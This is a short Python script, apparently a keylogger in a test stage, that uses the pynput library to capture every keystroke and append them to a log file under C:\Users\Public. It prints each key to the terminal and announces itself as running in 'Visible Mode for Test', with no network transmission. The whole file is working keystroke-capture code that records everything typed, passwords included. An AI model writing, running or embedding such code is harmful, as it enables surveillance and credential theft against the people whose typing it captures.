import pynput.keyboard
import time
import os

log = ""

# Local file logging (for testing)
log_file = "C:\\Users\\Public\\log.txt"

def process_key(key):
    global log

    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "

    print(f"[KEY PRESSED]: {key}")  # Visible on terminal

    if len(log) >= 10:
        with open(log_file, "a") as f:
            f.write(log + "\n")
        log = ""

def start_logger():
    with pynput.keyboard.Listener(on_press=process_key) as listener:
        listener.join()

print("✅ Keylogger Started... (Visible Mode for Test)")
start_logger()
